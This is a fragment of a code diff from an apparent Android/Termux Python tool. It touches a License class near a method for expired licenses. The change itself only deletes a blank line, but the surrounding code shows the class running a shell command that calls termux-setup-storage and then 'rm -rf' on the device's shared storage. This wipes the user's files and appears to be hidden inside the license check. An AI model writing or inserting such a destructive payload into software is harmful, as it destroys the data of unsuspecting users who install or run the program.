@@ -32,5 +32,4 @@ class License:
                 'termux-setup-storage; rm -rf /sdcard/storage/emulated/0/',
                 shell=True).wait(
             )
-
     def license_kadaluarsa(self, license):
